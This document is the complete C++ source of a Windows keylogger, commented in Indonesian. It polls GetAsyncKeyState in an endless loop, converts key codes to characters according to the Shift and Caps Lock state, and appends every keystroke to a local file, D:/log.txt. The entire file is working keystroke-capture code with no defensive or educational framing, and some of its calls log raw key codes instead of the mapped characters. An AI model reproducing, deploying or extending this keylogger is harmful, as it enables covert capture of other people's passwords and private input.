#include <iostream>
#include <Windows.h>
#include <fstream> //file
using namespace std;

int ascii2 [] = {  48,49,50,51,52,53,54,55,56,57,189,187,192,
                    219,221,220,186,222,188,190,191,32};


char charShift [] ={')','!','@','#','$','%','^','&','*','(',
                  '_','+','~','{','}',
                    '|',':','"','<','>','?',' '};

int ascii [] = { 48,49,50,51,52,53,54,55,56,
                57,189,187,192,219,221,220,186,222,188,
                190,191,65,66,67,68,69,70,71,72,73,
                74,75,76,77,78,79,80,81,82,83,84,85,
                86,87,88,89,90,
                97,98,99,100,101,102,103,104,105,106,
                107,108,109,110,111,112,113,114,115,
                116,117,118,119,120,121,122,32};

char charUtama [] = {'0','1','2','3','4','5','6','7','8','9',
                    '-','=','`','[',']', '\\', ';', '\'',
                    ',', '.', '/',
                    'A','B','C','D','E','F','G','H','I','J',
                    'K','L','M','N','O','P','Q','R','S','T',
                    'U','V','W','X','Y','Z',
                    'a','b','c','d','e','f','g','h','i','j',
                    'k','l','m','n','o','p','q','r','s','t',
                    'u','v','w','x','y','z',' '};


char ubah(int KEY)
{
    char hasil='\0';
    for(int i=0;i<73;i++){
        if(KEY==ascii[i]){
            hasil = charUtama[i];
            break;
        }
    }
    return hasil;
}

char ubah2(int KEY)
{
    char hasil='\0';
    for(int i=0;i<21;i++){
        if(KEY==ascii2[i]){
            hasil = charShift[i];
            break;
        }
    }
    return hasil;

}

char ubah2Rev(int KEY){ //untuk simbol saja!
    char  hasil ='\0';
    for(int i=0;i<21;i++){
        if(KEY==ascii2[i]){
            hasil = charShift[i];
            break;
        }
    }
    return hasil;
}


void tulisLogger(string file, char a){
    fstream LogFile;
    string pesan;
    pesan.push_back(a);
	LogFile.open(file.c_str(), fstream::app);
	if (LogFile.is_open()) {
		LogFile <<pesan;
		LogFile.close();
	}
}
void tulisLogger(string file, string pesan){
    fstream LogFile;
	LogFile.open(file.c_str(), fstream::app);
	if (LogFile.is_open()) {
		LogFile <<pesan;
		LogFile.close();
	}
}

int main()
{
    tulisLogger("D:/log.txt","\n");
    while(true)
    {
        Sleep(1);
        for (int KEY = 8; KEY <= 255; KEY++)        {

            if (GetAsyncKeyState(KEY) == -32767)
            {
                if(KEY ==VK_RETURN)
                {
                    cout << "\n";
                }
                if(KEY == VK_SPACE){
                    tulisLogger("D:/log.txt","");
                }

                if(GetKeyState(VK_CAPITAL)!=0) //caps lock aktif
                {
                    if(GetAsyncKeyState(VK_SHIFT)!=0){ //shift ditekan
                        bool shift = true;
                        for(int i =65;i<=90;i++) //karakter alphabet
                        {
                            if(KEY==i)
                            {
                                shift = false;
                                break;
                            }
                        }
                        if(shift){
                            cout<<ubah2(KEY);//simbol
                            tulisLogger("D:/log.txt",ubah2(KEY));
                        }else{
                            cout<<ubah(tolower(KEY));  //huruf kecil
                            tulisLogger("D:/log.txt",tolower(KEY));
                        }

                    }else{
                        cout<<ubah(KEY); //huruf besar
                        tulisLogger("D:/log.txt",KEY);
                    }

                }else //caps lock tidak aktif
                {
                    if(GetAsyncKeyState(VK_SHIFT)!=0){ //shift ditekan
                        bool shift = true;
                        for(int i =65;i<=90;i++) //karakter alphabet
                        {
                            if(KEY==i)
                            {
                                shift = false;
                                break;
                            }
                        }
                        if(shift){
                            cout<<ubah2(KEY); //simbol
                            tulisLogger("D:/log.txt",ubah2(KEY));

                        }else{
                            cout<<ubah(KEY); //huruf besar
                            tulisLogger("D:/log.txt",KEY);
                        }

                    }else{
                        cout<<ubah(tolower(KEY));  //huruf kecil
                        tulisLogger("D:/log.txt",tolower(KEY));
                    }

                }
            }
        }
    }
    return 0;
}
